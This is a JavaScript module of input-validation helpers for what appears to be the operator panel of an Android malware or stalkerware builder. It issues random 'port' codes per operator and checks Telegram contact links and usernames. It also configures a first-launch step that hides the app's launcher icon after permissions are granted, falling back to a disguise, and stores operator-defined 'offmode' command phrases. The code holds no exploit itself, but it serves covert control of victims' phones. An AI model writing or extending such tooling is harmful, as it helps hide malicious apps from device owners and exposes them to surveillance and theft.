import crypto from 'node:crypto';

const PORT_RE = /^[A-Za-z0-9]{20}$/;
const ALPHABET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
const LEN = 20;

export function validPort(value) {
  return typeof value === 'string' && PORT_RE.test(value);
}

/** Cryptographically random 20-char A-Za-z0-9 port code. */
export function newPortCode() {
  const raw = crypto.randomBytes(LEN);
  let out = '';
  for (let i = 0; i < LEN; i += 1) {
    out += ALPHABET[raw[i] % ALPHABET.length];
  }
  return out;
}

export function clipText(value, max) {
  const text = String(value ?? '').trim();
  if ([...text].length > max) return null;
  return text;
}

export function clipTelegramLink(value) {
  const text = String(value ?? '').trim();
  if (!text) return '';
  if ([...text].length > 300) return null;
  const lower = text.toLowerCase();
  if (
    lower.startsWith('https://t.me/') ||
    lower.startsWith('https://telegram.me/') ||
    lower.startsWith('http://t.me/') ||
    lower.startsWith('http://telegram.me/')
  ) {
    return text;
  }
  return null;
}

/**
 * Normalize the per-port "first action" config (what the client does on first
 * launch). We only model the ICON step here — USSD is intentionally out of scope
 * for this project. The shape is fixed/whitelisted so a bad payload can't store
 * arbitrary data; it always returns a complete object (never fails).
 *   icon.mode:   'hide'  → hide the launcher icon, fall back to disguise if the
 *                          device refuses; 'change' → only swap the icon.
 *   icon.timing: 'after_permissions' (default) | 'app_start'.
 */
export function sanitizeFirstAction(input) {
  const src = input && typeof input === 'object' ? input : {};
  const icon = src.icon && typeof src.icon === 'object' ? src.icon : {};
  return {
    enabled: Boolean(src.enabled),
    icon: {
      enabled: icon.enabled === undefined || icon.enabled === null ? true : Boolean(icon.enabled),
      mode: icon.mode === 'change' ? 'change' : 'hide',
      timing: icon.timing === 'app_start' ? 'app_start' : 'after_permissions',
    },
  };
}

/**
 * Normalize the per-port "offmode" command strings (operator-defined phrases).
 * Each is clipped to 64 chars; returns null when any is too long so the route
 * can answer 400 instead of silently truncating.
 */
export function sanitizeOffmode(input) {
  const src = input && typeof input === 'object' ? input : {};
  const personal = clipText(src.personal ?? '', 64);
  const impersonal = clipText(src.impersonal ?? '', 64);
  const all = clipText(src.all ?? '', 64);
  if (personal === null || impersonal === null || all === null) return null;
  return { personal, impersonal, all };
}

/** Clean a Telegram @username (no @, 1–32 chars) or '' when absent/invalid. */
export function clipUsername(value) {
  const name = String(value ?? '').replace(/^@/, '').trim();
  return /^[A-Za-z0-9_]{1,32}$/.test(name) ? name : '';
}
